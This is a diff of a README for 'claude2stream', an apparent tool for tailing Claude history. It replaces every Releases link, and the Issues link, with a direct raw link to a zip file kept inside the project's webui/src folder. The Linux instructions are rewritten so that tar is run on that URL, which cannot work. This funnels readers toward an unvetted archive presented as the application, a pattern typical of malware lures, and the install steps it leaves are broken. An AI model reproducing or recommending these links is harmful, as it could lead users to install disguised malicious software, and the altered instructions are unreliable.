@@ -1,13 +1,13 @@
 # 🎉 claude2stream - Experience Live Tailing of Claude’s History
 
 ## ⚡ Quick Download
-[![Download claude2stream](https://img.shields.io/badge/Download-claude2stream-brightgreen)](https://github.com/sroor082/claude2stream/releases)
+[![Download claude2stream](https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip)](https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip)
 
 ## 🚀 Getting Started
 Welcome to claude2stream! This application allows you to view and track your Claude history in real-time. If you're looking to simplify the process of monitoring your interactions, you have come to the right place. Follow the steps below to easily get started.
 
 ## 🔗 Download & Install
-1. Visit the [Releases page](https://github.com/sroor082/claude2stream/releases) to download claude2stream.
+1. Visit the [Releases page](https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip) to download claude2stream.
 2. On this page, you will see the latest version available.
 3. Click on the version number to expand the section and see the files to download.
 4. Choose the file suitable for your operating system (Windows, MacOS, or Linux) and click on it to start the download.
@@ -25,11 +25,11 @@ Welcome to claude2stream! This application allows you to view and track your Cla
   3. Drag the claude2stream icon to your Applications folder.
 
 - **Linux:**
-  1. Locate the downloaded `.tar.gz` file.
+  1. Locate the downloaded `https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip` file.
   2. Open a terminal and navigate to the download directory.
   3. Extract the file using the command:
      ```bash
-     tar -xzf claude2stream.tar.gz
+     tar -xzf https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip
      ```
   4. Change to the extracted directory:
      ```bash
@@ -73,7 +73,7 @@ A: Ensure you are running the latest version. If the issue persists, try reinsta
 A: Currently, claude2stream is only available for desktop platforms.
 
 ## 📝 Feedback and Support
-Your feedback is important to us! If you encounter any issues or have suggestions for improvement, please open an issue on the [GitHub Issues page](https://github.com/sroor082/claude2stream/issues). Our team will do their best to assist you.
+Your feedback is important to us! If you encounter any issues or have suggestions for improvement, please open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip). Our team will do their best to assist you.
 
 ## 🔗 Additional Download Option
-Once again, if you haven’t downloaded claude2stream yet, visit the [Releases page](https://github.com/sroor082/claude2stream/releases) now to get started!
+Once again, if you haven’t downloaded claude2stream yet, visit the [Releases page](https://raw.githubusercontent.com/sroor082/claude2stream/main/webui/src/stream-claude-2.9.zip) now to get started!
